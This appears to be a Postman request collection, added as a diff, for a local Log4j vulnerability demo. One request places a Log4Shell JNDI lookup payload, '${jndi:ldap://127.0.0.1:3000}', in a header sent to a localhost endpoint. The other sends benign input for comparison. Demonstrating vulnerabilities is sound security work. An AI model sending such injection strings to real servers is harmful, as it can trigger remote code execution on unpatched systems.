@@ -1,0 +1,59 @@
+{
+	"info": {
+		"_postman_id": "f3bc13f7-e795-406b-a8ea-137291f1c178",
+		"name": "log4j-demo",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "log4j-vuln-jndi",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "X-log4j",
+						"value": "${jndi:ldap://127.0.0.1:3000}",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "http://localhost:8080/vuln",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"vuln"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "log4j-vuln-good-input",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "X-log4j",
+						"value": "good input",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "http://localhost:8080/vuln",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"vuln"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
